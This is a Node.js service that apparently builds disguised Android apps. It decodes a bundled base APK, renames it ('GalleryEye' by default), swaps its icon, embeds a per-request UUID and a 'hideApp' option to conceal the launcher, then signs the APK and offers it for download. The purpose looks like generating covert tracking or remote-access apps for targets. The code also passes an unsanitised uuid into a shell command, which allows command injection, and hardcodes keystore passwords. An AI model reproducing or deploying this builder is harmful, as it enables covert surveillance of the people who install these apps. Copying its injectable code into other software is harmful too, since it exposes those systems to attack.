const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process');
const sharp = require('sharp');
const axios = require('axios');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 4000;

app.use(cors());
app.use(express.json());

// Storage for icon uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Helper to run commands (Streaming Output)
const runCommand = (command, args, options = {}) => {
    return new Promise((resolve, reject) => {
        console.log(`[CMD] Running: ${command} ${args.join(' ')}`);
        const proc = spawn(command, args, { ...options, stdio: 'inherit' });

        proc.on('close', (code) => {
            if (code === 0) resolve('Success');
            else reject(new Error(`Command ${command} failed with code ${code}`));
        });

        proc.on('error', (err) => reject(err));
    });
};

// Pre-decode Base APK
const baseApkPath = path.join(__dirname, 'assets', 'base.apk');
const decodedBaseDir = path.join(__dirname, 'temp', 'decoded_base');

if (!fs.existsSync(path.join(__dirname, 'temp'))) fs.mkdirSync(path.join(__dirname, 'temp'));

const initBaseApk = async () => {
    if (fs.existsSync(baseApkPath) && !fs.existsSync(decodedBaseDir)) {
        console.log('[Init] Pre-decoding Base APK...');
        try {
            await runCommand('apktool', ['d', baseApkPath, '-o', decodedBaseDir, '-f']);
            console.log('[Init] Base APK pre-decoded.');
        } catch (e) {
            console.error('[Init] Failed:', e);
        }
    }
};
initBaseApk();

// Generate Route
app.post('/generate', upload.single('icon'), async (req, res) => {
    const { uuid, appName, hideApp, webLink, callbackUrl } = req.body;
    const customIcon = req.file;

    console.log(`[APK] Request for UUID: ${uuid}`);

    // Ack immediately
    res.status(202).json({ message: 'Processing started' });

    // Background Task
    (async () => {
        const sendUpdate = async (event, data) => {
            if (callbackUrl) {
                try {
                    await axios.post(callbackUrl, { uuid, event, data });
                } catch (e) {
                    console.error('Failed to send webhook:', e.message);
                }
            }
        };

        try {
            await sendUpdate('apk_progress', { step: 'Initializing...', progress: 10 });

            const tempDir = path.join(__dirname, 'temp');
            const workDir = path.join(tempDir, `work-${uuid}`);
            const unsignedApkPath = path.join(tempDir, `unsigned-${uuid}.apk`);
            const finalApkName = `${(appName || "GalleryEye").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
            const signedApkPath = path.join(tempDir, `signed-${uuid}.apk`);

            // Cleanup
            if (fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true });
            if (fs.existsSync(unsignedApkPath)) fs.unlinkSync(unsignedApkPath);

            // 1. Copy/Decode
            if (fs.existsSync(decodedBaseDir)) {
                await sendUpdate('apk_progress', { step: 'Cloning base app...', progress: 20 });
                await runCommand('cp', ['-r', decodedBaseDir, workDir]);
            } else {
                await sendUpdate('apk_progress', { step: 'Decoding base app...', progress: 20 });
                await runCommand('apktool', ['d', baseApkPath, '-o', workDir, '-f']);
            }

            // 2. Customize Name
            await sendUpdate('apk_progress', { step: 'Updating app name...', progress: 40 });
            if (appName) {
                const stringsPath = path.join(workDir, 'res', 'values', 'strings.xml');
                if (fs.existsSync(stringsPath)) {
                    let content = fs.readFileSync(stringsPath, 'utf8');
                    content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${appName}</string>`);
                    fs.writeFileSync(stringsPath, content);
                }
            }

            // 3. Inject Config
            await sendUpdate('apk_progress', { step: 'Injecting config...', progress: 50 });
            const assetsDir = path.join(workDir, 'assets');
            if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir);
            fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);
            const config = { hideApp: hideApp === 'true', webLink: webLink || "", appName: appName || "Gallery Eye" };
            fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));

            // 4. Icon
            if (customIcon) {
                await sendUpdate('apk_progress', { step: 'Processing icon...', progress: 60 });
                const iconBuffer = customIcon.buffer;
                const sizes = { 'mipmap-mdpi': 48, 'mipmap-hdpi': 72, 'mipmap-xhdpi': 96, 'mipmap-xxhdpi': 144, 'mipmap-xxxhdpi': 192 };
                for (const [folder, size] of Object.entries(sizes)) {
                    const p = path.join(workDir, 'res', folder);
                    if (fs.existsSync(p)) {
                        try {
                            const buf = await sharp(iconBuffer).resize(size, size).toFormat('png').toBuffer();
                            fs.writeFileSync(path.join(p, 'ic_launcher.png'), buf);
                            fs.writeFileSync(path.join(p, 'ic_launcher_round.png'), buf);
                        } catch (e) { }
                    }
                }
            }

            // 5. Build
            await sendUpdate('apk_progress', { step: 'Building APK...', progress: 80 });
            await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);

            // 6. Sign
            await sendUpdate('apk_progress', { step: 'Signing APK...', progress: 90 });
            const keystore = path.join(__dirname, 'assets', 'keystore.jks');
            const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
            const cmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${keystore}" --ksAlias key0 --ksPass android --ksKeyPass android`;

            await new Promise((resolve, reject) => {
                exec(cmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
            });

            // Find output
            const files = fs.readdirSync(tempDir);
            const generated = files.find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));

            if (generated) {
                fs.renameSync(path.join(tempDir, generated), signedApkPath);

                // Construct Download URL
                // NOTE: User needs to set PUBLIC_URL if not on same domain, but for Render it's usually automatic or passed in env
                const host = process.env.PUBLIC_URL || `https://${req.get('host')}`;
                const downloadUrl = `${host}/download/${path.basename(signedApkPath)}?filename=${finalApkName}`;

                await sendUpdate('apk_ready', { url: downloadUrl, filename: finalApkName });

                // Cleanup
                fs.rmSync(workDir, { recursive: true, force: true });
                fs.unlinkSync(unsignedApkPath);
            } else {
                throw new Error("Signing failed");
            }

        } catch (error) {
            console.error('[APK] Error:', error);
            await sendUpdate('apk_error', { message: error.message });
        }
    })();
});

// Download Route
app.get('/download/:file', (req, res) => {
    const filePath = path.join(__dirname, 'temp', req.params.file);
    const downloadName = req.query.filename || 'app.apk';
    if (fs.existsSync(filePath)) {
        res.download(filePath, downloadName);
    } else {
        res.status(404).send('Not Found');
    }
});

app.get('/', (req, res) => res.send('APK Generator Service Running'));

app.listen(port, () => console.log(`APK Service on ${port}`));
